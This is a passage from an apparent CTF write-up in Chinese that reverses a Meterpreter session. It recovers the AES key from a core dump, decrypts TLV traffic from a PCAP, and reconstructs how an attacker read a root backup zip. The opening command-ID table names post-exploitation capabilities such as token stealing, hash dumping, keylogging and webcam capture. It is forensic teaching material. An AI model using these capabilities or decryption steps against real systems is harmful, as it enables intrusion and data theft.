cmd_ids[1014] = "STDAPI_FS_SEPARATOR"
cmd_ids[1015] = "STDAPI_FS_SHA1"
cmd_ids[1016] = "STDAPI_FS_STAT"
cmd_ids[1017] = "STDAPI_NET_CONFIG_ADD_ROUTE"
cmd_ids[1018] = "STDAPI_NET_CONFIG_GET_ARP_TABLE"
cmd_ids[1019] = "STDAPI_NET_CONFIG_GET_INTERFACES"
cmd_ids[1020] = "STDAPI_NET_CONFIG_GET_NETSTAT"
cmd_ids[1021] = "STDAPI_NET_CONFIG_GET_PROXY"
cmd_ids[1022] = "STDAPI_NET_CONFIG_GET_ROUTES"
cmd_ids[1023] = "STDAPI_NET_CONFIG_REMOVE_ROUTE"
cmd_ids[1024] = "STDAPI_NET_RESOLVE_HOST"
cmd_ids[1025] = "STDAPI_NET_RESOLVE_HOSTS"
cmd_ids[1026] = "STDAPI_NET_SOCKET_TCP_SHUTDOWN"
cmd_ids[1027] = "STDAPI_NET_TCP_CHANNEL_OPEN"
cmd_ids[1028] = "STDAPI_RAILGUN_API"
cmd_ids[1029] = "STDAPI_RAILGUN_API_MULTI"
cmd_ids[1030] = "STDAPI_RAILGUN_MEMREAD"
cmd_ids[1031] = "STDAPI_RAILGUN_MEMWRITE"
cmd_ids[1032] = "STDAPI_REGISTRY_CHECK_KEY_EXISTS"
cmd_ids[1033] = "STDAPI_REGISTRY_CLOSE_KEY"
cmd_ids[1034] = "STDAPI_REGISTRY_CREATE_KEY"
cmd_ids[1035] = "STDAPI_REGISTRY_DELETE_KEY"
cmd_ids[1036] = "STDAPI_REGISTRY_DELETE_VALUE"
cmd_ids[1037] = "STDAPI_REGISTRY_ENUM_KEY"
cmd_ids[1038] = "STDAPI_REGISTRY_ENUM_KEY_DIRECT"
cmd_ids[1039] = "STDAPI_REGISTRY_ENUM_VALUE"
cmd_ids[1040] = "STDAPI_REGISTRY_ENUM_VALUE_DIRECT"
cmd_ids[1041] = "STDAPI_REGISTRY_LOAD_KEY"
cmd_ids[1042] = "STDAPI_REGISTRY_OPEN_KEY"
cmd_ids[1043] = "STDAPI_REGISTRY_OPEN_REMOTE_KEY"
cmd_ids[1044] = "STDAPI_REGISTRY_QUERY_CLASS"
cmd_ids[1045] = "STDAPI_REGISTRY_QUERY_VALUE"
cmd_ids[1046] = "STDAPI_REGISTRY_QUERY_VALUE_DIRECT"
cmd_ids[1047] = "STDAPI_REGISTRY_SET_VALUE"
cmd_ids[1048] = "STDAPI_REGISTRY_SET_VALUE_DIRECT"
cmd_ids[1049] = "STDAPI_REGISTRY_UNLOAD_KEY"
cmd_ids[1050] = "STDAPI_SYS_CONFIG_DRIVER_LIST"
cmd_ids[1051] = "STDAPI_SYS_CONFIG_DROP_TOKEN"
cmd_ids[1052] = "STDAPI_SYS_CONFIG_GETENV"
cmd_ids[1053] = "STDAPI_SYS_CONFIG_GETPRIVS"
cmd_ids[1054] = "STDAPI_SYS_CONFIG_GETSID"
cmd_ids[1055] = "STDAPI_SYS_CONFIG_GETUID"
cmd_ids[1056] = "STDAPI_SYS_CONFIG_LOCALTIME"
cmd_ids[1057] = "STDAPI_SYS_CONFIG_REV2SELF"
cmd_ids[1058] = "STDAPI_SYS_CONFIG_STEAL_TOKEN"
cmd_ids[1059] = "STDAPI_SYS_CONFIG_SYSINFO"
cmd_ids[1060] = "STDAPI_SYS_EVENTLOG_CLEAR"
cmd_ids[1061] = "STDAPI_SYS_EVENTLOG_CLOSE"
cmd_ids[1062] = "STDAPI_SYS_EVENTLOG_NUMRECORDS"
cmd_ids[1063] = "STDAPI_SYS_EVENTLOG_OLDEST"
cmd_ids[1064] = "STDAPI_SYS_EVENTLOG_OPEN"
cmd_ids[1065] = "STDAPI_SYS_EVENTLOG_READ"
cmd_ids[1066] = "STDAPI_SYS_POWER_EXITWINDOWS"
cmd_ids[1067] = "STDAPI_SYS_PROCESS_ATTACH"
cmd_ids[1068] = "STDAPI_SYS_PROCESS_CLOSE"
cmd_ids[1069] = "STDAPI_SYS_PROCESS_EXECUTE"
cmd_ids[1070] = "STDAPI_SYS_PROCESS_GET_INFO"
cmd_ids[1071] = "STDAPI_SYS_PROCESS_GET_PROCESSES"
cmd_ids[1072] = "STDAPI_SYS_PROCESS_GETPID"
cmd_ids[1073] = "STDAPI_SYS_PROCESS_IMAGE_GET_IMAGES"
cmd_ids[1074] = "STDAPI_SYS_PROCESS_IMAGE_GET_PROC_ADDRESS"
cmd_ids[1075] = "STDAPI_SYS_PROCESS_IMAGE_LOAD"
cmd_ids[1076] = "STDAPI_SYS_PROCESS_IMAGE_UNLOAD"
cmd_ids[1077] = "STDAPI_SYS_PROCESS_KILL"
cmd_ids[1078] = "STDAPI_SYS_PROCESS_MEMORY_ALLOCATE"
cmd_ids[1079] = "STDAPI_SYS_PROCESS_MEMORY_FREE"
cmd_ids[1080] = "STDAPI_SYS_PROCESS_MEMORY_LOCK"
cmd_ids[1081] = "STDAPI_SYS_PROCESS_MEMORY_PROTECT"
cmd_ids[1082] = "STDAPI_SYS_PROCESS_MEMORY_QUERY"
cmd_ids[1083] = "STDAPI_SYS_PROCESS_MEMORY_READ"
cmd_ids[1084] = "STDAPI_SYS_PROCESS_MEMORY_UNLOCK"
cmd_ids[1085] = "STDAPI_SYS_PROCESS_MEMORY_WRITE"
cmd_ids[1086] = "STDAPI_SYS_PROCESS_THREAD_CLOSE"
cmd_ids[1087] = "STDAPI_SYS_PROCESS_THREAD_CREATE"
cmd_ids[1088] = "STDAPI_SYS_PROCESS_THREAD_GET_THREADS"
cmd_ids[1089] = "STDAPI_SYS_PROCESS_THREAD_OPEN"
cmd_ids[1090] = "STDAPI_SYS_PROCESS_THREAD_QUERY_REGS"
cmd_ids[1091] = "STDAPI_SYS_PROCESS_THREAD_RESUME"
cmd_ids[1092] = "STDAPI_SYS_PROCESS_THREAD_SET_REGS"
cmd_ids[1093] = "STDAPI_SYS_PROCESS_THREAD_SUSPEND"
cmd_ids[1094] = "STDAPI_SYS_PROCESS_THREAD_TERMINATE"
cmd_ids[1095] = "STDAPI_SYS_PROCESS_WAIT"
cmd_ids[1096] = "STDAPI_UI_DESKTOP_ENUM"
cmd_ids[1097] = "STDAPI_UI_DESKTOP_GET"
cmd_ids[1098] = "STDAPI_UI_DESKTOP_SCREENSHOT"
cmd_ids[1099] = "STDAPI_UI_DESKTOP_SET"
cmd_ids[1100] = "STDAPI_UI_ENABLE_KEYBOARD"
cmd_ids[1101] = "STDAPI_UI_ENABLE_MOUSE"
cmd_ids[1102] = "STDAPI_UI_GET_IDLE_TIME"
cmd_ids[1103] = "STDAPI_UI_GET_KEYS_UTF8"
cmd_ids[1104] = "STDAPI_UI_SEND_KEYEVENT"
cmd_ids[1105] = "STDAPI_UI_SEND_KEYS"
cmd_ids[1106] = "STDAPI_UI_SEND_MOUSE"
cmd_ids[1107] = "STDAPI_UI_START_KEYSCAN"
cmd_ids[1108] = "STDAPI_UI_STOP_KEYSCAN"
cmd_ids[1109] = "STDAPI_UI_UNLOCK_DESKTOP"
cmd_ids[1110] = "STDAPI_WEBCAM_AUDIO_RECORD"
cmd_ids[1111] = "STDAPI_WEBCAM_GET_FRAME"
cmd_ids[1112] = "STDAPI_WEBCAM_LIST"
cmd_ids[1113] = "STDAPI_WEBCAM_START"
cmd_ids[1114] = "STDAPI_WEBCAM_STOP"
cmd_ids[1115] = "STDAPI_AUDIO_MIC_START"
cmd_ids[1116] = "STDAPI_AUDIO_MIC_STOP"
cmd_ids[1117] = "STDAPI_AUDIO_MIC_LIST"
cmd_ids[1118] = "STDAPI_SYS_PROCESS_SET_TERM_SIZE"
cmd_ids[1119] = "STDAPI_SYS_PROCESS_MEMORY_SEARCH"
cmd_ids[2001] = "PRIV_ELEVATE_GETSYSTEM"
cmd_ids[2002] = "PRIV_FS_BLANK_DIRECTORY_MACE"
cmd_ids[2003] = "PRIV_FS_BLANK_FILE_MACE"
cmd_ids[2004] = "PRIV_FS_GET_FILE_MACE"
cmd_ids[2005] = "PRIV_FS_SET_FILE_MACE"
cmd_ids[2006] = "PRIV_FS_SET_FILE_MACE_FROM_FILE"
cmd_ids[2007] = "PRIV_PASSWD_GET_SAM_HASHES"
cmd_ids[3001] = "EXTAPI_ADSI_DOMAIN_QUERY"
cmd_ids[3002] = "EXTAPI_CLIPBOARD_GET_DATA"
cmd_ids[3003] = "EXTAPI_CLIPBOARD_MONITOR_DUMP"
cmd_ids[3004] = "EXTAPI_CLIPBOARD_MONITOR_PAUSE"
cmd_ids[3005] = "EXTAPI_CLIPBOARD_MONITOR_PURGE"
cmd_ids[3006] = "EXTAPI_CLIPBOARD_MONITOR_RESUME"
cmd_ids[3007] = "EXTAPI_CLIPBOARD_MONITOR_START"
cmd_ids[3008] = "EXTAPI_CLIPBOARD_MONITOR_STOP"
cmd_ids[3009] = "EXTAPI_CLIPBOARD_SET_DATA"
cmd_ids[3010] = "EXTAPI_NTDS_PARSE"
cmd_ids[3011] = "EXTAPI_PAGEANT_SEND_QUERY"
cmd_ids[3012] = "EXTAPI_SERVICE_CONTROL"
cmd_ids[3013] = "EXTAPI_SERVICE_ENUM"
cmd_ids[3014] = "EXTAPI_SERVICE_QUERY"
cmd_ids[3015] = "EXTAPI_WINDOW_ENUM"
cmd_ids[3016] = "EXTAPI_WMI_QUERY"
cmd_ids[4001] = "SNIFFER_CAPTURE_DUMP"
cmd_ids[4002] = "SNIFFER_CAPTURE_DUMP_READ"
cmd_ids[4003] = "SNIFFER_CAPTURE_RELEASE"
cmd_ids[4004] = "SNIFFER_CAPTURE_START"
cmd_ids[4005] = "SNIFFER_CAPTURE_STATS"
cmd_ids[4006] = "SNIFFER_CAPTURE_STOP"
cmd_ids[4007] = "SNIFFER_INTERFACES"
cmd_ids[7001] = "WINPMEM_DUMP_RAM"
cmd_ids[8001] = "KIWI_EXEC_CMD"
cmd_ids[10001] = "UNHOOK_PE"
cmd_ids[11001] = "ESPIA_IMAGE_GET_DEV_SCREEN"
cmd_ids[12001] = "INCOGNITO_ADD_GROUP_USER"
cmd_ids[12002] = "INCOGNITO_ADD_LOCALGROUP_USER"
cmd_ids[12003] = "INCOGNITO_ADD_USER"
cmd_ids[12004] = "INCOGNITO_IMPERSONATE_TOKEN"
cmd_ids[12005] = "INCOGNITO_LIST_TOKENS"
cmd_ids[12006] = "INCOGNITO_SNARF_HASHES"
cmd_ids[13001] = "PYTHON_EXECUTE"
cmd_ids[13002] = "PYTHON_RESET"
cmd_ids[14001] = "POWERSHELL_ASSEMBLY_LOAD"
cmd_ids[14002] = "POWERSHELL_EXECUTE"
cmd_ids[14003] = "POWERSHELL_SESSION_REMOVE"
cmd_ids[14004] = "POWERSHELL_SHELL"
cmd_ids[15001] = "LANATTACKS_ADD_TFTP_FILE"
cmd_ids[15002] = "LANATTACKS_DHCP_LOG"
cmd_ids[15003] = "LANATTACKS_RESET_DHCP"
cmd_ids[15004] = "LANATTACKS_RESET_TFTP"
cmd_ids[15005] = "LANATTACKS_SET_DHCP_OPTION"
cmd_ids[15006] = "LANATTACKS_START_DHCP"
cmd_ids[15007] = "LANATTACKS_START_TFTP"
cmd_ids[15008] = "LANATTACKS_STOP_DHCP"
cmd_ids[15009] = "LANATTACKS_STOP_TFTP"
cmd_ids[16001] = "PEINJECTOR_INJECT_SHELLCODE"
cmd_ids[17001] = "MIMIKATZ_CUSTOM_COMMAND"
```

现在可以导入它并将数值传递给tlv_types并取回字符串。这很简洁，因为它表明客户端做的第一件事是发送一个RSA公钥，然后服务器发送回一个加密的对称密钥:

``` bash
Packet: type=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x00\x10'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601'
TLV l=302      t=TLV_TYPE_RSA_PUB_KEY       v=b'0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03'
Packet: type=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x00\x10'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=12       t=TLV_TYPE_SYM_KEY_TYPE      v=b'\x00\x00\x00\x01'
TLV l=264      t=TLV_TYPE_ENC_SYM_KEY       v=b'-I\x1d\xc1\xa3YLu\xa9\x99/\x96>\xe9\x1f\x9c\xf9g~\x0f'
```

#### 提取AES密钥

如果无法访问私有RSA密钥，就无法从PCAP中获得未加密的AES密钥。但是，当进程运行时，key将在内存中，这意味着它将在core.auto_update中.

AES256的密钥将是随机32字节。有很多方法可以找到这个key。一种方法是一次一个字节地遍历dump，尝试每个32字节的缓冲区。core dump没有那么大(2.7M)，所以这是可能的。但也有更好的方法。

另一种方法是运行gdb auto_update core.auto_update将core dump加载到GDB中。然后，可以使用一些逆向工程来确定key在内存中的位置，并通过GDB获取它。

最简单的方法是利用AES将密钥转换为所谓的"key schedule" 或 "round keys"。[这篇文章](https://diyinfosec.medium.com/scanning-memory-for-fek-e17ca3db09c9)很好地解释了它(在"Approach 4"部分)。基本上，AES会把32个字节转换成15个16字节的round keys。这些看起来也是随机的。通常，程序只生成一次这些key，然后将它们存储在内存中，并在需要时使用它们，通常，就在内存中原始key的旁边，像这样:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response6.png)

因为从密钥生成round keys的算法是公开的，所以可以扫描内存，对于每个可能的密钥，检查它是否会生成接下来的15*16 = 240字节。如果有匹配，那肯定是AES密钥。

[bulk_extractor](https://github.com/simsong/bulk_extractor)是实现这种搜索的一个工具(以及许多其他工具)。下载最新的版本，运行

``` bash
git clone https://github.com/simsong/bulk_extractor
cd bulk_extractor
git submodule update --init --recursive
./configure; make; sudo make install
```

它被安装在机器上。在coredump上运行它，给它一个输出到的文件夹:

``` bash
bulk_extractor core.auto_update -o bulk_extractor/
```

找到AES key:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response]
└─# cat bulk_extractor/aes_keys.txt     
# BANNER FILE NOT PROVIDED (-b option)
# BULK_EXTRACTOR-Version: 2.0.1
# Feature-Recorder: aes_keys
# Filename: core.auto_update
# Feature-File-Version: 1.1
1687472 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
2510080 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
2796144 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
2801600 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
```

#### 解析加密的TLVs数据流

把这个key添加到Python脚本的顶部:

``` bash
aes_key = bytes.fromhex('f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5')
```

现在，在解析TLV数据之前解密它:

``` bash
    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)
    if enc_flag == 1:
        aes_iv = tlv_data[:16]
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
        tlv_data = cipher.decrypt(tlv_data[16:])
```

我发现了一些奇怪的边缘情况，在TLV数据的末尾有额外的数据(空值或AES填充?)为了解释这一点，将在顶部添加一些额外的检查:

``` bash
    while j < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if j + l > len(tlv_data) or l == 0:
            break
```

``` bash
Packet: type=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_NEGOTIATE_TLV_ENCRYPT
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601672178'
TLV l=302      t=TLV_TYPE_RSA_PUB_KEY       v=b'0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82'
Packet: type=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_NEGOTIATE_TLV_ENCRYPT
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601672178'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=12       t=TLV_TYPE_SYM_KEY_TYPE      v=b'\x00\x00\x00\x01'
TLV l=264      t=TLV_TYPE_ENC_SYM_KEY       v=b'-I\x1d\xc1\xa3YLu\xa9\x99/\x96>\xe9\x1f\x9c\xf9g~\x0fH8\xee\xe1y\xf1'
Packet: type=Req  len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_MACHINE_ID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'02317692758618192060783778'
Packet: type=Resp len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_MACHINE_ID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'02317692758618192060783778'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=54       t=TLV_TYPE_MACHINE_ID        v=b'10.10.13.37:b88b42ad757245'
...[snip]...
```

加密数据包的最后一行显示了MACHINE_ID的类型和IP地址的值。

#### Meterpreter Session 分析

解析后的pcap的完整输出在[msf_output.txt](https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-response/msf_output.txt)。我将介绍一些重点。

每个请求包似乎都有COMMAND_ID和REQUEST_ID。COMMAND_ID定义了命令的类型(可以在[command_ids.h](https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/command_ids.h)查看)。REQUEST_ID对于请求来说似乎是唯一的。例如:

``` bash
Packet: type=Req  len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x04\x1f'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'507543306427'
```

0x41f = 1055 = `COMMAND_ID_STDAPI_SYS_CONFIG_GETUID:=. 响应返回COMMAND_ID和REQUEST_ID(有时带有一些额外的数据?)以及UUID` and the result:

``` bash
Packet: type=Resp len=184      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x04\x1f'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'50754330642773297958'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=55       t=TLV_TYPE_USER_NAME         v=b'root @ response (uid'
```

添加一些代码来解析这些命令id，将它们添加到常量中，然后像这样调用它:

``` bash
    j = 0
    while j + 8 < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if l == 0:
            import pdb;pdb.set_trace()
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        if t == 0x20001: #COMMAND_ID
            v = cmd_ids[int.from_bytes(v[:4], 'big')]
        print(f"TLV l={l:<8} t={tlv_types[t]:<26} v={v if len(v) <= 20 else v[:20]}")
        j += l
```

现在 REQUEST_ID 看起来:

``` bash
Packet: type=Req  len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_SYS_CONFIG_GETUID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'50754330642773297958262819401791\x00'
Packet: type=Resp len=184      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_SYS_CONFIG_GETUID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'50754330642773297958262819401791\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=55       t=TLV_TYPE_USER_NAME         v=b'root @ response (uid=0, gid=0, euid=0, egid=0)\x00'
```

另一个有趣的命令是FL_LS:

``` bash
Packet: type=Resp len=360      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_FS_LS
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20050676170239424614686344865879\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=20       t=TLV_TYPE_FILE_NAME         v=b'auto_update\x00'
TLV l=29       t=TLV_TYPE_FILE_PATH         v=b'/dev/shm/auto_update\x00'
TLV l=72       t=TLV_TYPE_STAT_BUF          v=b"\x1a\x00\x00\x00\xed\x81\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x98\xc0\x0f\x00\x00\x00\x00\x00o'/b\x00\x00\x00\x00\x8a\x1e/b\x00\x00\x00\x00m'/b\x00\x00\x00\x00"
TLV l=18       t=TLV_TYPE_FILE_NAME         v=b'multipath\x00'
TLV l=27       t=TLV_TYPE_FILE_PATH         v=b'/dev/shm/multipath\x00'
TLV l=72       t=TLV_TYPE_STAT_BUF          v=b'\x1a\x00\x00\x00\xc0A\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\xc3'
```

似乎对于每个文件，它都会返回FILE_NAME、FILE_PATH和STAT_BUF。不确定如何解释STAT_BUF。

可以看到会话中执行的命令及其结果:

|  Command   | Response  |
|  ----  | ----  |
| CORE_NEGOTIATE_TLV_ENCRYPTION (includes RSA public key)  | Sends encrypted symmetric key |
| CORE_MACHINE_ID  | 10.10.13.37:b88b42ad757245828e688fdbfa4824f8 |
| CORE_SET_SESSION_GUID  | - |
| CORE_ENUMEXTCMD  | Returns a long list of UINTs |
| STDAPI_FS_GETWD  | /dev/shm |
| STDAPI_SYS_CONFIG_GETUID  | root @ response root @ response (uid=0, gid=0, euid=0, egid=0) |
| STDAPI_SYS_CONFIG_SYSINFO  | Three TLVS:
 COMPUTER_NAME = 10.10.13.37
 OS_NAME = Ubuntu 20.04 (Linux 5.4.0-100-generic)
 ARCHITECTURE = x86_64
 BUILD_TUPLE = x86_64-linux-musl |
| STDAPI_NET_CONFIG_GET_INTERFACES  | Full list of interfaces |
| STDAPI_NET_CONFIG_GET_ROUTES  | Full list of routes |
| STDAPI_FS_GETWD  | /dev/shm |
| STDAPI_FS_STAT, FILE_PATH = /dev/shm  | A STAT_BUF. Not sure how to interpret. |
| STDAPI_FS_LS, DIRECTORY_PATH = /dev/shm  | Two files, auto_update and multipath. |
| STDAPI_FS_GETWD  | /dev/shm |
| STDAPI_FS_STAT, FILE_PATH = /root  | A STAT_BUF. Not sure how to interpret. |
| STDAPI_FS_LS, DIRECTORY_PATH = /root  | Files in /root. |
| STDAPI_FS_STAT, FILE_PATH = /root/docs_backup.zip  | A STAT_BUF. Not sure how to interpret. |
| CORE_CHANNEL_OPEN, FILE_PATH = /root/docs_backup.zip  | Returns a channel id. |
| STDAPI_FS_STAT, FILE_PATH = /root/docs_backup.zip  | A STAT_BUF. Not sure how to interpret. |
| CORE_CHANNEL_READ, CHANNEL_ID = 1  | 1,048,576 bytes, starting with PK |
| CORE_CHANNEL_READ, CHANNEL_ID = 1  | 	225,962 bytes |
| CORE_CHANNEL_READ, CHANNEL_ID = 1  | No data |
| CORE_CHANNEL_EOF, CHANNEL_ID = 1  | - |
| CORE_CHANNEL_CLOSE, CHANNEL_ID = 1  | - |

#### Extract Zip

注意到，大文件传输发生在上传/root/docs_backup.zip时。报告中的提示已经提到需要进入zip存档。将添加一些代码来保存zip文件。有三个CHANNEL_READ请求:

``` bash
Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'81583094782444646844363494472485\x00'
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=12       t=TLV_TYPE_LENGTH            v=b'\x00\x10\x00\x00'
Packet: type=Resp len=1048712  enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'81583094782444646844363494472485\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=1048584  t=TLV_TYPE_CHANNEL_DATA      v=b'PK\x03\x04\n\x00\x00\x00\x00\x00\xb4TnT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x1c\x00Documents/UT\t\x00\x03\xe3\x0c/b\\\x9bJcux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\xabTnT\x1cV\x87\xf8\x85\x00\x00\x00\xf5\x00\x00\x00\x14\x00\x1c\x00Documents/.tmux.confUT\t\x00\x03\xd1\x0c/ba\r/bux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00\x8d\x8e\xc1\n\xc3 \x10D\xef~\xc5b)9\t\xbd\xf4{\x82\xda\xad.5\xab\xe8\xa6!\x94\xfe{\x95\xder(\x9d\xd30\xf3\x06\xa6\xa1\x80\t\x10\xa9I\xae\xbbI\xb4\x90\xc0\xf5\xd2'
Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'48857921355208983185187224372436\x00'
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=12       t=TLV_TYPE_LENGTH            v=b'\x00\x10\x00\x00'
Packet: type=Resp len=226104   enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'48857921355208983185187224372436\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=225970   t=TLV_TYPE_CHANNEL_DATA      v=b'\xfa\x8a"\x15\xb3[BS\x04~\x15VV\x80\xbc!\xb7)Q<\xce\xe5\xc0y1\x19U\xbe\x94\xd4\x1e\xd6\xd0D\x12\xb5S\xe3\xa6"a@\xfaXO\x9a\xb2V\xf4\xceb\xbd\xde\xbf\xda\\.\x81\xd1\xd6\nzc|E\x16c\xc7X`*\xf8\x88\x11e;\xdb1T\xfe\xc8\xd1_\xbf,\xb1!!A\x9eg\xba\xde\xa5\x99$\xf9\x81{\xbc\x14b\xe2\x9a;\x16\xb0\xee^%\xf6`]\x85\x00x:a\x0c\xbe\xe3\x97i\x97\xcdJ{\xf5]w2G\xe0D\xe5P\x8a\xd8d\xe2j\'\x13\xfe\xa1\xae\x1c\xc6zF\x0c\x94L\xcc\xd7\xdd\x9dj\xa1\xe7\xaa\x83t\xd4\xc1\xa7W\x1b\xac\x1e\x8f\xa0\x19\x0f^T\xfa \xf3e\xf0\xddg\x05GWnj\xa2\xfb \xf0\xd0\xd8\xe3(\xab\xb8\xb6C'
Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'71560517686021057956178610979680\x00'
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=12       t=TLV_TYPE_LENGTH            v=b'\x00\x10\x00\x00'
Packet: type=Resp len=136      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
